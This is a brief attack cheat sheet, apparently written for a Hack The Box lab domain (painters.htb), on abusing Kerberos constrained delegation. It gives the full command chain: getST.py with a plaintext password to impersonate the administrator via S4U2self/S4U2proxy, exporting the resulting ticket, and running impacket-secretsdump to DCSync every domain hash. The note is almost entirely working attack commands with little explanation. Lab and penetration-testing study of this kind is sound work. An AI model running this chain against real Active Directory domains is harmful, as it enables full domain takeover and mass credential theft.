
This attack requests an TGT for the victim user and executes the S4U2self/S4U2proxy proccess to impersonte the admin user. 

1. Request Ticket

```
getST.py painters.htb/blake:'Pass123!' -spn CIFS/dc.painters.htb -impersonate administrator -altservice 'cifs'
```

2. Export .ccache ticket into Kerberos Variable

```
export KRB5CCNAME=administrator@cifs_dc.painters.htb@PAINTERS.HTB.ccache
```

2. Perform DCSync Attack to dump all Domain Hashes

```
impacket-secretsdump -k -no-pass 'painters.htb/Administrator'@dc.painters.htb
```